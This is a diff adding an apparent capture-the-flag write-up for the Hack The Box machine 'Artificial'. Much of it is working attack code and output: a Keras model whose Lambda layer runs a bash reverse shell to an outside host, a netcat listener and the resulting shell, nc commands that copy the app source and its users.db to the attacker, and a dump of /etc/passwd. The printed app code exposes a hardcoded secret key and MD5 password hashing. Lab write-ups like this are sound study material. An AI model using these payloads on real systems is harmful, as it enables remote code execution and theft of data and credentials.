@@ -1,0 +1,173 @@
+## artificial.htb
+
+#### https://app.hackthebox.com/machines/Artificial
+
+**Dockerfile**
+```
+FROM python:3.8-slim
+
+WORKDIR /code
+
+RUN apt-get update && \
+    apt-get install -y curl && \
+    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
+    rm -rf /var/lib/apt/lists/*
+
+RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl
+
+ENTRYPOINT ["/bin/bash"]
+```
+
+**requirements.txt**
+```
+tensorflow-cpu==2.13.1
+
+```
+
+```py
+import tensorflow as tf
+
+def reverse_shell(x):
+    import os
+    os.system('bash -c "bash -i >& /dev/tcp/10.10.16.55/1717 0>&1"')
+    return x
+
+model = tf.keras.Sequential()
+model.add(tf.keras.layers.Input(shape=(64,)))
+model.add(tf.keras.layers.Lambda(reverse_shell))
+model.compile()
+model.save("reverse_shell.h5")
+```
+
+```
+Hexada@hexada ~/Downloads$ nc -lnvp 1717                                                                                         
+```
+
+![image](https://github.com/user-attachments/assets/04baf05d-89aa-4ad0-9407-32cd71edabe8)
+
+```
+Hexada@hexada ~/pentest-env/vrm/artificial.htb$ nc -lnvp 1717                                                               1 ↵  
+Connection from 10.10.11.74:34848
+bash: cannot set terminal process group (873): Inappropriate ioctl for device
+bash: no job control in this shell
+app@artificial:~/app$ ls
+app.py
+instance
+models
+__pycache__
+static
+templates
+```
+
+```
+Hexada@hexada ~/pentest-env/vrm/artificial.htb$ nc -lnvp 1717 > app.py
+
+app@artificial:~/app$ nc 10.10.16.55 1818 < app.py
+```
+
+```py
+from flask import Flask, render_template, request, redirect, url_for, session, send_file, flash
+from flask_sqlalchemy import SQLAlchemy
+from werkzeug.utils import secure_filename
+import os
+import tensorflow as tf
+import hashlib
+import uuid
+import numpy as np
+import io
+from contextlib import redirect_stdout
+import hashlib
+
+app = Flask(__name__)
+app.secret_key = "Sup3rS3cr3tKey4rtIfici4L"
+
+app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
+app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
+app.config['UPLOAD_FOLDER'] = 'models'
+
+db = SQLAlchemy(app)
+
+MODEL_FOLDER = 'models'
+os.makedirs(MODEL_FOLDER, exist_ok=True)
+
+class User(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    username = db.Column(db.String(100), unique=True, nullable=False)
+    email = db.Column(db.String(120), unique=True, nullable=False)
+    password = db.Column(db.String(200), nullable=False)
+    models = db.relationship('Model', backref='owner', lazy=True)
+
+class Model(db.Model):
+    id = db.Column(db.String(36), primary_key=True)
+    filename = db.Column(db.String(120), nullable=False)
+    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
+
+def allowed_file(filename):
+    return '.' in filename and filename.rsplit('.', 1)[1].lower() == 'h5'
+
+def hash(password):
+ password = password.encode()
+ hash = hashlib.md5(password).hexdigest()
+ return hash
+```
+
+```
+app@artificial:~/app/instance$ ls
+ls
+users.db
+```
+
+```
+hash = hashlib.md5(password).hexdigest()
+```
+
+```
+Hexada@hexada ~/pentest-env/vrm/artificial.htb$ nc -lnvp 1717 > users.db
+
+app@artificial:~/app$ nc 10.10.16.55 1818 < users.db
+```
+
+![image](https://github.com/user-attachments/assets/6a931375-3655-4714-9e26-bbae3db8b397)
+
+```
+app@artificial:~/app$ cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+gael:x:1000:1000:gael:/home/gael:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+app:x:1001:1001:,,,:/home/app:/bin/bash
+mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
+_laurel:x:997:997::/var/log/laurel:/bin/false
+```
